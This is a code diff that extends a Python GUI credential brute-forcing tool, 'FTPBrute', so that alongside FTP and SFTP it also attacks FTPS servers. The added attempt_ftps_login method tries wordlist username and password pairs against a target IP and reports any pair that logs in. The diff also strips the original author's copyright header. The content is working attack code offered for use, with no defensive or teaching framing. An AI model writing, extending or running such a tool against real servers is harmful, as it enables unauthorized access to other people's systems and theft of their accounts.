@@ -1,6 +1,3 @@
-# copyright © Sreeraj, 2024
-# https://github.com/s-r-e-e-r-a-j
-
 import ftplib
 import paramiko
 import tkinter as tk
@@ -8,12 +5,13 @@ from tkinter import filedialog, messagebox, scrolledtext
 from tkinter import ttk
 import threading
 import itertools
+import ssl  # Required for FTPS
 
 class FTPBruteForceTool:
     def __init__(self, root):
         self.root = root
         self.root.title("FTPBrute - FTP Brute Force Tool")
-        self.root.geometry("550x700")
+        self.root.geometry("550x750")  # Adjusted height to fit both buttons fully
         self.root.config(bg="#2e2e2e")  
         self.is_running = False  
 
@@ -34,7 +32,7 @@ class FTPBruteForceTool:
         copyright_label.pack(pady=5)
 
         # Target IP entry
-        ttk.Label(root, text="Target FTP/SFTP IP Address:").pack(pady=5)
+        ttk.Label(root, text="Target FTP/SFTP/FTPS IP Address:").pack(pady=5)
         self.target_entry = ttk.Entry(root, width=50)
         self.target_entry.pack(pady=5)
 
@@ -45,6 +43,8 @@ class FTPBruteForceTool:
         ftp_radio.pack()
         sftp_radio = ttk.Radiobutton(root, text="SFTP", variable=self.protocol, value="SFTP")
         sftp_radio.pack()
+        ftps_radio = ttk.Radiobutton(root, text="FTPS", variable=self.protocol, value="FTPS")
+        ftps_radio.pack()
 
         # Port Number Entry (Optional)
         ttk.Label(root, text="Port Number (Optional):").pack(pady=5)
@@ -95,10 +95,10 @@ class FTPBruteForceTool:
         username_file = self.username_file.get()
         password_file = self.password_file.get()
         protocol = self.protocol.get()
-        
+
         # If user entered a port number, use it; otherwise, use default values
         port_input = self.port_entry.get().strip()
-        port = int(port_input) if port_input.isdigit() else (22 if protocol == "SFTP" else 21)
+        port = int(port_input) if port_input.isdigit() else (990 if protocol == "FTPS" else (22 if protocol == "SFTP" else 21))
 
         if not target_ip or not username_file or not password_file:
             messagebox.showwarning("Input Error", "Please fill all fields and select both wordlists.")
@@ -110,6 +110,8 @@ class FTPBruteForceTool:
             self.output_area.insert(tk.END, f"Starting brute force on FTP of {target_ip}\n")
         elif protocol == "SFTP":
             self.output_area.insert(tk.END, f"Starting brute force on SFTP of {target_ip}\n")
+        elif protocol == "FTPS":
+            self.output_area.insert(tk.END, f"Starting brute force on FTPS of {target_ip}\n")
         self.output_area.yview(tk.END)
         self.output_area.config(state='disabled')
 
@@ -150,6 +152,14 @@ class FTPBruteForceTool:
                     self.output_area.config(state='disabled')
                     messagebox.showinfo("Success", f"Successful login found: {username}:{password}")
                     break
+                elif protocol == "FTPS" and self.attempt_ftps_login(target_ip, username, password, port):
+                    self.output_area.config(state='normal')
+                    self.output_area.insert(tk.END, f"Success! Username: {username}, Password: {password}\n")
+                    self.output_area.yview(tk.END)
+                    self.output_area.config(state='disabled')
+                    messagebox.showinfo("Success", f"Successful login found: {username}:{password}")
+                    break
+
             else:
                 # If no valid combination is found after trying all
                 self.output_area.config(state='normal')
@@ -188,6 +198,20 @@ class FTPBruteForceTool:
         except Exception:
             return False
 
+    def attempt_ftps_login(self, target_ip, username, password, port):
+        """Attempt FTPS login."""
+        try:
+            context = ssl.create_default_context()
+            ftps = ftplib.FTP_TLS(context=context)
+            ftps.connect(target_ip, port)
+            ftps.login(username, password)
+            ftps.quit()
+            return True
+        except ftplib.error_perm:
+            return False
+        except Exception:
+            return False
+
     def stop_bruteforce(self):
         """Stop the brute force attack."""
         self.is_running = False
@@ -197,10 +221,10 @@ class FTPBruteForceTool:
 if __name__ == "__main__":
     root = tk.Tk()
     app = FTPBruteForceTool(root)
-    
+
     # Center the window
     root.update_idletasks()
-    width, height = 550, 700
+    width, height = 550, 750
     x, y = (root.winfo_screenwidth() - width) // 2, (root.winfo_screenheight() - height) // 2
     root.geometry(f"{width}x{height}+{x}+{y}")
 
